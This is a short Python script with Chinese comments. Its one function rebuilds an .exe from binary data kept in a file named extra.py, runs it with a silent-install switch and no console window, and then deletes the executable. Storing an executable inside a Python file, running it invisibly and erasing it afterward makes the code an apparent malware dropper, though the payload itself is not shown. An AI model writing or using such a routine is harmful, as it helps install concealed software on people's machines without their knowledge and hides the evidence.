import subprocess
import os
import sys

def restore_and_install(exe_path, extra_file='extra.py', silent_args='/S'):
    """
    从 extra.py 恢复 .exe 文件并静默安装，确保程序在后台运行，并在安装后删除 .exe 文件
    
    :param exe_path: 恢复的 .exe 文件路径
    :param extra_file: 存储二进制数据的文件路径，默认为 'extra.py'
    :param silent_args: 静默安装的命令行参数，默认为 '/S'
    """
    try:
        # 从 extra.py 导入 binary_data
        from extra import binary_data

        # 将二进制数据写入到指定的 .exe 文件
        with open(exe_path, 'wb') as f:
            f.write(binary_data)
        
        print(f"已将二进制数据恢复为 {exe_path}")

        # 构造安装命令
        install_command = [exe_path, silent_args]

        # 使用 subprocess 执行静默安装并确保不显示命令行窗口
        if sys.platform == "win32":
            # Windows 特有的创建标志，确保程序在后台运行，不弹出命令行窗口
            creation_flags = subprocess.CREATE_NO_WINDOW
        else:
            creation_flags = 0  # 对于非 Windows 系统，可以保持默认行为

        # 执行静默安装
        subprocess.run(install_command, check=True, creationflags=creation_flags)
        print(f"{exe_path} 安装完成")

        # 安装完成后删除 .exe 文件
        if os.path.exists(exe_path):
            os.remove(exe_path)
            print(f"{exe_path} 已被删除")
    
    except ImportError:
        print(f"无法从 {extra_file} 导入二进制数据，请检查文件内容。")
    except subprocess.CalledProcessError as e:
        print(f"安装失败: {e}")
    except Exception as e:
        print(f"发生错误: {e}")
